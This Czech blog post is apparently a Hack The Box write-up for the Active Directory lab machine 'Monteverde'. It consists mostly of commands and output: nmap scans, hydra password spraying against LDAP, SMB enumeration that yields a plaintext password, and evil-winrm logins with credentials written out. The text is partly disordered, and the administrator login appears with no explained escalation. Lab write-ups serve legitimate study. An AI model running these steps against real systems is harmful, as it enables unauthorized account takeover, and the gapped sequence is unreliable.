---
layout: post
author: Tomáš Matějíček
title: "Monteverde"
date: 2020-12-17
tags: windows linux kerberos ldap winrm active-directory
---

## Úvod a kontext

Monteverde je stroj z Hack The Box. Dochované podklady zachycují jen část postupu, proto níže ponechávám pouze technicky doložitelné kroky a chybějící části výslovně označuji k ověření.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
ports=$(nmap -Pn -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);nmap -Pn -p $ports -A -sC -sV -v $IP
```
```
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49702,49771
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-11 21:39:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49771/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/11%Time=5E1A3EB1%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Vyhledání otevřených portů (2)

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49702,49771 -n -v -sV -Pn --script *vuln*,*enum* $IP
```

## Analýza zjištění

### Lámání hesel nebo hashů

Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
```bash
hydra -L Monteverde-users.txt -P Monteverde-users.txt $IP ldap2 -I
```
```
=> [389][ldap2] host: 10.10.10.172   login: SABatchJobs   password: __CENSORED__
```

## Počáteční průzkum

### Enumerace SMB

U SMB sdílení ověřuji, jaká data jsou dostupná bez dalších oprávnění a zda z nich lze získat účty, dokumenty nebo konfigurační tajemství.
```bash
./enum4linux.pl -a -d -o -v -u SABatchJobs -p SABatchJobs $IP > Monteverde-enum4linux.txt
```
```
=> home$/mhope/azure.xml: 4n0therD4y@n0th3r$
```

## Získání přístupu

### Přihlášení na cíl

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```bash
./evil-winrm/evil-winrm.rb -i $IP -u mhope -p "4n0therD4y@n0th3r$"
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
```bash
cat user.txt
```
```
__CENSORED__
```

### Přihlášení na cíl (2)

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```bash
./evil-winrm/evil-winrm.rb -i $IP -u administrator -p "d0m@in4dminyeah!"
```
```
gc root.txt
__CENSORED__
```

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.

[POZNÁMKA K OVĚŘENÍ: V dostupném podkladu chybí konkrétní kroky pro eskalaci oprávnění a získání root přístupu. Bez dalších artefaktů je nelze doplnit technicky přesně.]

## Shrnutí klíčových poznatků

- Dochované podklady zachycují jen část postupu, proto jsou místa bez opory ve zdrojovém textu označena ověřovací poznámkou místo domněnek.
- Záměrně nedoplňuji neověřené detaily o exploitu, kredenciálech ani eskalaci; publikovatelná verze musí stát jen na dohledatelných krocích.
- Chybějící mezikroky mezi enumerací, potvrzením přístupu a finální eskalací zůstávají explicitně otevřené k doplnění z ověřených podkladů.

## Co si odnést do praxe

- Pro publikovatelný HTB write-up je nutné uložit i mezikroky mezi enumerací, hypotézou a potvrzením přístupu; samotné placeholdery nestačí.
- Pokud chybí výstupy nebo přesná argumentace, je lepší explicitně přiznat nejistotu než doplňovat neověřené technické detaily.
- Stejné techniky mají smysl pouze v laboratorním nebo jinak autorizovaném testovacím prostředí.
